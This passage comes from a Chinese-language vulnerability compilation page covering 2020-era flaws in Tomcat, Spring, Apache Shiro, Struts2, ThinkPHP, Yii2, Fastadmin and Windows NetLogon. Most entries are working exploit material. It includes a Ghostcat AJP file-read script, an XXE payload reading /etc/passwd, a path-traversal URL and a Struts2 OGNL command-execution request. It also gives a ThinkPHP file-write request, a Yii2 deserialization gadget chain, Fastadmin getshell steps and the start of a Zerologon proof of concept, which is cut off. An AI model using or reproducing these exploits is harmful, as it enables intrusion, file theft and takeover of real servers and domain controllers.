class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"target"</span>, type=str, help=<span class="string">"Hostname or IP to attack"</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=int, default=<span class="number">8009</span>, help=<span class="string">"AJP port to attack (default is 8009)"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-f"</span>, <span class="string">'--file'</span>, type=str, default=<span class="string">'WEB-INF/web.xml'</span>, help=<span class="string">"file path :(WEB-INF/web.xml)"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">'/asdf'</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.request_uri'</span>,<span class="string">'/'</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.path_info'</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.servlet_path'</span>,<span class="string">'/'</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line">print(<span class="string">'----------------------------'</span>)</span><br><span class="line">print(<span class="string">""</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure><h4 id="8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484"><a href="#8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484" class="headerlink" title="8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484"></a>8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484</h4><p><strong>参考：</strong><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106937171" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106937171</a> <a href="https://xz.aliyun.com/t/7803#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7803#toc-1</a></p><h4 id="9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660"><a href="#9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660" class="headerlink" title="9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660"></a>9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660</h4><h2 id="四、框架"><a href="#四、框架" class="headerlink" title="四、框架"></a>四、框架</h2><h3 id="JAVA："><a href="#JAVA：" class="headerlink" title="JAVA："></a>JAVA：</h3><h4 id="1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"><a href="#1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398" class="headerlink" title="1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"></a>1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20-</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.248.129:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/Sylon/p/12700849.html" target="_blank" rel="noopener">https://www.cnblogs.com/Sylon/p/12700849.html</a></p><h4 id="2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421"><a href="#2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421" class="headerlink" title="2、Spring Framework反射型文件下载漏洞 CVE-2020-5421"></a>2、Spring Framework反射型文件下载漏洞 CVE-2020-5421</h4><p>参考：<a href="https://xz.aliyun.com/t/8341?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8341?page=5</a> </p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247495382&amp;idx=3&amp;sn=21e43c186df31d9df263d211b4af208a&amp;chksm=fa3aae0ccd4d271a3e848e6ad5820a3867c1a2e1f7376af12aadb0b946d5814c548f7f1e01ac&amp;scene=0&amp;xtrack=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247495382&amp;idx=3&amp;sn=21e43c186df31d9df263d211b4af208a&amp;chksm=fa3aae0ccd4d271a3e848e6ad5820a3867c1a2e1f7376af12aadb0b946d5814c548f7f1e01ac&amp;scene=0&amp;xtrack=1#rd</a></p><h4 id="3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410"><a href="#3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410" class="headerlink" title="3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410"></a>3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip:8889&#x2F;flag.txt%23&#x2F;222&#x2F;..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</span><br></pre></td></tr></table></figure><p><strong>参考：</strong><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p><h4 id="4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF"><a href="#4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF" class="headerlink" title="4、Spring Cloud Netflix Hystrix Dashboard SSRF"></a>4、Spring Cloud Netflix Hystrix Dashboard SSRF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proxy.stream?origin&#x3D;http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><h4 id="5、Apache-Cocoon-XML注入-cve-2020-11991"><a href="#5、Apache-Cocoon-XML注入-cve-2020-11991" class="headerlink" title="5、Apache Cocoon XML注入 cve-2020-11991"></a>5、Apache Cocoon XML注入 cve-2020-11991</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version="1.0" ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.cnblogs.com/Yang34/p/13665674.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13665674.html</a></p><h4 id="6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933"><a href="#6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933" class="headerlink" title="6、Apache Shiro 权限绕过漏洞 CVE-2020-13933"></a>6、Apache Shiro 权限绕过漏洞 CVE-2020-13933</h4><h4 id="7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989"><a href="#7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989" class="headerlink" title="7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989"></a>7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;;&#x2F;admin&#x2F;index</span><br><span class="line"> http:&#x2F;&#x2F;localhost:8080&#x2F;admin&#x2F;index&#x2F;</span><br></pre></td></tr></table></figure><p><strong>参考：</strong><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p><h4 id="8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995"><a href="#8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995" class="headerlink" title="8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995"></a>8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995</h4><h4 id="9、Apache-Dubbo反序列化漏洞-CVE-2020-1948"><a href="#9、Apache-Dubbo反序列化漏洞-CVE-2020-1948" class="headerlink" title="9、Apache Dubbo反序列化漏洞 CVE-2020-1948"></a>9、Apache Dubbo反序列化漏洞 CVE-2020-1948</h4><h4 id="10、Apache-Dubbo反序列化漏洞-CVE-2019-1756"><a href="#10、Apache-Dubbo反序列化漏洞-CVE-2019-1756" class="headerlink" title="10、Apache Dubbo反序列化漏洞 CVE-2019-1756"></a>10、Apache Dubbo反序列化漏洞 CVE-2019-1756</h4><h4 id="11、Struts2远程代码执行漏洞-CVE-2019-0230"><a href="#11、Struts2远程代码执行漏洞-CVE-2019-0230" class="headerlink" title="11、Struts2远程代码执行漏洞 CVE-2019-0230"></a>11、Struts2远程代码执行漏洞 CVE-2019-0230</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">poc1:</span></span><br><span class="line">http://ip:port/test-S2-059.action?payload=%25%7b%31%2b%34%7d%0a</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">poc2:</span></span><br><span class="line">POST /s2_059/index.action HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8085</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 606</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:8085</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:8085/s2_059_war/</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=272825C954147516F847095B055202B5; JSESSIONID=01F82222F5CCED3DC9B7819AE6C98DA0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://paper.seebug.org/1331/" target="_blank" rel="noopener">https://paper.seebug.org/1331/</a></p><h4 id="12、Jackson-多个反序列化安全漏洞-CVE-2020-24616"><a href="#12、Jackson-多个反序列化安全漏洞-CVE-2020-24616" class="headerlink" title="12、Jackson 多个反序列化安全漏洞 CVE-2020-24616"></a>12、Jackson 多个反序列化安全漏洞 CVE-2020-24616</h4><h4 id="13、Fastjson-lt-1-2-68-远程命令执行漏洞"><a href="#13、Fastjson-lt-1-2-68-远程命令执行漏洞" class="headerlink" title="13、Fastjson &lt;= 1.2.68 远程命令执行漏洞"></a>13、Fastjson &lt;= 1.2.68 远程命令执行漏洞</h4><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="1、ThinkPHP-3-x注入漏洞"><a href="#1、ThinkPHP-3-x注入漏洞" class="headerlink" title="1、ThinkPHP 3.x注入漏洞"></a>1、ThinkPHP 3.x注入漏洞</h4><h4 id="2、ThinkPHP-6-任意文件操作漏洞"><a href="#2、ThinkPHP-6-任意文件操作漏洞" class="headerlink" title="2、ThinkPHP 6 任意文件操作漏洞"></a>2、ThinkPHP 6 任意文件操作漏洞</h4><p>备注：2020年1月老漏洞</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tp6/public/index.php/index/test1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 24</span><br><span class="line"><span class="attribute">Origin</span>: http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/tp6/public/index.php/index/test1</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=1234567890123456789012345678.php;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">key=&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h4 id="3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148"><a href="#3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148" class="headerlink" title="3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148"></a>3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148</h4><figure class="highlight php"><figcaption><span>exp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span> <span class="title">extends</span> \<span class="title">yii</span>\<span class="title">base</span>\<span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span> <span class="keyword">extends</span> <span class="title">Action</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = $func;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="string">"run"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">base</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BaseObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        //</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> <span class="keyword">extends</span> <span class="title">BaseObject</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = <span class="keyword">new</span> \yii\db\BatchQueryResult($func, $param);</span><br><span class="line"><span class="keyword">print</span>(serialize($exp));</span><br></pre></td></tr></table></figure><p>参考：<a href="https://mp.weixin.qq.com/s/3a3whSUhxMZz2g3btxdytw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3a3whSUhxMZz2g3btxdytw</a> <a href="https://xz.aliyun.com/t/8307" target="_blank" rel="noopener">https://xz.aliyun.com/t/8307</a></p><h4 id="4、Fastadmin文件上传漏洞，危害级别：高危"><a href="#4、Fastadmin文件上传漏洞，危害级别：高危" class="headerlink" title="4、Fastadmin文件上传漏洞，危害级别：高危"></a>4、Fastadmin文件上传漏洞，危害级别：高危</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">通过前文可知，这个漏洞的利用点在_empty()函数，需要注意的是，在官方文档中通常_empty()方法是用来判断一个方法是否存在，如果不存在，则进入该函数。而这里是开发者自定义的方法，因此直接传入_empty方法，调用name参数即可。</span><br><span class="line"></span><br><span class="line">利用过程如下：</span><br><span class="line"></span><br><span class="line">在前台的会员中心，个人资料处，上传修改头像：</span><br><span class="line"></span><br><span class="line">5.png</span><br><span class="line"></span><br><span class="line">抓包后修改图片数据（满足图片头格式即可）：</span><br><span class="line"></span><br><span class="line">6.png</span><br><span class="line"></span><br><span class="line">记录下路径后，成功getshell</span><br><span class="line"></span><br><span class="line">7.png</span><br><span class="line"></span><br><span class="line">在Linux下，通过这种方法会失效，因为在&#x2F;public路径下不存在user目录，由前文中的知识点可以知道，当不存在这个目录的时候，无论怎么跳转目录，is_file()函数返回的结果始终未false，因此无法利用该漏洞，如下图所示：</span><br><span class="line"></span><br><span class="line">8.png</span><br><span class="line"></span><br><span class="line">当我们在&#x2F;public目录下创建文件夹&#x2F;user，在利用，即可成功：</span><br><span class="line"></span><br><span class="line">9.png</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.cnpanda.net/codeaudit/777.html" target="_blank" rel="noopener">https://www.cnpanda.net/codeaudit/777.html</a></p><h4 id="5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540"><a href="#5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540" class="headerlink" title="5、thinkadmin 目录遍历/任意文件读取 CVE-2020-25540"></a>5、thinkadmin 目录遍历/任意文件读取 CVE-2020-25540</h4><p>参考：<a href="https://github.com/zoujingli/ThinkAdmin/issues/244" target="_blank" rel="noopener">https://github.com/zoujingli/ThinkAdmin/issues/244</a></p><h2 id="五、操作系统"><a href="#五、操作系统" class="headerlink" title="五、操作系统"></a>五、操作系统</h2><h4 id="1、Windows-NetLogon特权提升漏洞-CVE-2020-1472"><a href="#1、Windows-NetLogon特权提升漏洞-CVE-2020-1472" class="headerlink" title="1、Windows NetLogon特权提升漏洞 CVE-2020-1472"></a>1、Windows NetLogon特权提升漏洞 CVE-2020-1472</h4><p><strong>利用条件：</strong></p><p>未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞。成功利用此漏洞的攻击者可获得域管理员访问权。</p><p>可以下载<a href="https://github.com/Kamimuka/CVE-2020-1472/blob/master/2.py" target="_blank" rel="noopener">利用脚本1-置空密码</a>和<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py" target="_blank" rel="noopener">利用脚本2-恢复密码</a>来Getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CVE-2020-1472 - Zerologon</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Paper:    https://www.secura.com/pathtoimg.php?id=2055</span></span><br><span class="line"><span class="comment"># PoC by:   Pablo Martínez (@xassiz) &amp;&amp; Antón Ortigueira (@antuache) from BlackArrow</span></span><br><span class="line"><span class="comment"># Web:      [www.blackarrow.net] - [www.tarlogic.com]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.ndr <span class="keyword">import</span> NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray, \</span><br><span class="line">NDRUniFixedArray, NDRUniConformantVaryingArray</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dtypes <span class="keyword">import</span> WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, NULL, LONG, UCHAR, PRPC_SID, \</span><br><span class="line">GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.nrpc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> 